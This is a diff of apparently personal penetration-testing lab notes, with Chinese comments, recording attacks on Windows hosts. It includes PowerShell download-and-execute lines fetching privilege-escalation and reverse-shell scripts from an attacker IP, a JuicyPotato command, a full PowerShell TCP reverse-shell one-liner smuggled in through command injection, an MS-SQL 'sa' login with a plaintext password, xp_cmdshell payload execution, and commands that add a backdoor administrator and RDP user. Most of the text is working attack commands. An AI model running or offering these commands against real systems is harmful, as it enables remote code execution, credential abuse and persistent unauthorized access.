@@ -48,7 +48,7 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {3D14228D-FBE1-11
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Sherlock.ps1')
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/PowerUp.ps1')
 
-sqsh -S 10.11.1.31 -U sa -P poiuytrewq
+
 xp_cmdshell "powershell -c IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/Invoke-PowerShellTcp.ps1')"
 
 PS C:\timmy> whoami /priv
@@ -71,4 +71,12 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 3.嘗試 ; ' " ＆ 可斷開或是接續執行指令,＆可接續執行指令
 4.嘗試revershe shell cheat sheet,這台是windows，嘗試powershell指令,這條可以
 192.168.119.134& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-5.在smb裡面發現MS-SQL帳密,透過sqsh登入後取得reverse shell,參考tally
+5.在smb裡面(base-login.txt)發現MS-SQL帳密,透過sqsh登入後取得reverse shell,參考tally
+sqsh -S 10.11.1.31 -U sa -P poiuytrewq
+
+net user timmy timmy /add
+net  localgroup "Remote Desktop Users" "timmy" /add
+net  localgroup "Administrators" "timmy" /add
+
+
+findstr /s /n "poiuytrewq" C:\
